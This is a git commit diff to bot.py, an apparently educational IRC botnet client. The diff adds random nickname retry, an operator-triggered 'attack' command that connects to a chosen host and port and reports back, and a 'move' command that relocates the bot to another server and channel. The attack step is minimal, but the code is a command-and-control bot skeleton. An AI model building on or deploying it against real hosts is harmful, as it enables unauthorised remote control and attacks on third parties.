5473f1d7ab3fa8300610d474924eccb339783e96
yuechen1 <yuechen1@live.com>
2017-04-02 14:57:33 -0700

    finishing up bot code, connect is acting up

--- bot.py
+++ bot.py
@@ -7,10 +7,12 @@
 import socket
 import sys
 import time
+import os
+import random
 
 #slitly modifided code for spliting messages from server
 def parsemsg(s):
-    #print(s)
+    print(s)
     """Breaks a message from an IRC server into its sender, prefix, command, and arguments.
     """
     sender = ''
@@ -32,19 +34,24 @@ def parsemsg(s):
     else:
         argspar = s.split()
     commandpar = argspar.pop(0)
+    #print("sender:", sender)
+    #print("commandpar:", commandpar)
+    #print("args:", argspar)
     return sender, prefixpar, commandpar, argspar
 
 #ping message
 def isping(s, sock):
     """Breakdown the message to see if it is a ping message"""
-    ping, rest = s.split(' ', 1)
-    if ping == 'PING':
-        pong = 'PONG' + rest
-        try:
-            sock.send(pong.encode("utf-8"))
-        except OSError:
-            print("cannot return ping")
-        return True
+    if s.find(' :') != -1:
+        ping, rest = s.split(' :', 1)
+        if ping == 'PING':
+            print("a ping is found")
+            pong = 'PONG :' + rest
+            try:
+                sock.send(pong.encode("utf-8"))
+            except OSError:
+                print("cannot return ping")
+            return True
     else:
         return False
 
@@ -58,7 +65,8 @@ secret = ''
 poweruser = []
 attackhost = ''
 attackport = ''
-botname = 'bot1'    #TODO name must be randomly generated
+botname = 'bot1'
+attacknumber = 1
 
 #runtime boolean
 shutoff = False
@@ -80,6 +88,9 @@ try:
     print(secret)
 except ValueError:
     print("invalid input: ", sys.argv[2])
+
+#set random
+random.seed(os.urandom(5))
 
 #connect to server
 ircsocket = socket.socket()
@@ -105,10 +116,23 @@ while not shutoff:
         try:
             time.sleep(1)
             while not isname:
-                ircsocket.send("NICK {}\r\n".format(botname).encode("utf-8")) #TODO check to see if nickname is in use
+                ircsocket.send("NICK {}\r\n".format(botname).encode("utf-8"))
                 ircsocket.send("USER {} 0 * {}\r\n".format(botname, botname).encode("utf-8"))
-                isname = True
+                while isname:
+                    ircinput = ircsocket.recv(1024).decode("utf-8")
+                    user, prefix, command, args = parsemsg(ircinput)
+                    if command == "NOTICE\r\n":
+                        if "Nickname is already in use" in args[1]:
+                            print("botname failed:", botname)
+                            botname = 'bot' + str(random.randint(0, 1000))
+                            break
+                        elif "Welcome" in args[1]:
+                            isname = True
+                            break
+                        time.sleep(1)
+            
             ircsocket.send("JOIN {}\r\n".format(channel).encode("utf-8"))
+            print("JOIN {}\r\n".format(channel))
         except OSError:
             print("failed to connect to channel")
     try:
@@ -134,27 +158,57 @@ while not shutoff:
                 try:
                     ircsocket.send("PRIVMSG {} :{}\r\n".format(user, botname).encode("utf-8"))
                     print("PRIVMSG {} :{}\r\n".format(user, botname).encode("utf-8"))
-                    print("message sent")
                 except OSError:
                     print("failed to identify self")
 
             #attempt to attack the network
             elif "attack" in args[1] and user in poweruser:
                 try:
-                    nouse, attackhost, attackport = args[1]
+                    #split the attack command
+                    nouse, attackhost, attackport = args[1].split(' ')
+                    print("attackhost:", attackhost)
+                    print("attackport:", attackport)
+
+                    #create socket
                     attacksocket = socket.socket()
                     attacksocket.connect((socket.gethostbyname(attackhost), int(attackport)))
-                    ircsocket.send("PRIVMSG {} :attack sucessful\r\n").format(user).encode("utf-8")
+                    attacksocket.send("{} {}".format(attacknumber, botname).encode("utf-8"))
+                    isattack = True
+
+                    #send response to user
+                    ircsocket.send("PRIVMSG {} :attack sucessful\r\n".format(user).encode("utf-8"))
                 except socket.timeout:
-                    ircsocket.send("PRIVMSG {} :attack failed, cannot connect to host\r\n").format(user).encode("utf-8")
+                    ircsocket.send("PRIVMSG {} :attack failed, cannot connect to host\r\n".format(user).encode("utf-8"))
                 except OSError:
-                    ircsocket.send("PRIVMSG {} :attack failed, cannot connect to host\r\n").format(user).encode("utf-8")
+                    ircsocket.send("PRIVMSG {} :attack failed, cannot connect to host\r\n".format(user).encode("utf-8"))
                 except ValueError:
-                    pass
+                    print("not an attack command")
                 print("attack is found")
 
             #move to a different channel
             elif "move" in args[1] and user in poweruser:
+                try:
+                    ircsocket.send("PRIVMSG {} :moving to new server\r\n".format(user).encode("utf-8"))
+                    ircsocket.close()
+                    ircsocket = socket.socket()
+                    nouse, hostname, port, channel = args[1].split(' ')
+                    channel = '#' + channel
+                    issocket = False
+                    isname = False
+                    while not issocket:
+                        ircsocket.connect((socket.gethostbyname(hostname), int(port)))
+                        issocket = True
+                        print("new connection is made")
+                        time.sleep(3)
+                except socket.timeout:
+                    issocket = False
+                    time.sleep(5)
+                except OSError:
+                    print("cannot connect to ircserver")
+                    issocket = False
+                    time.sleep(5)
+                except ValueError:
+                    print("move command wrong")
                 print("move is found")
 
             #close this bot
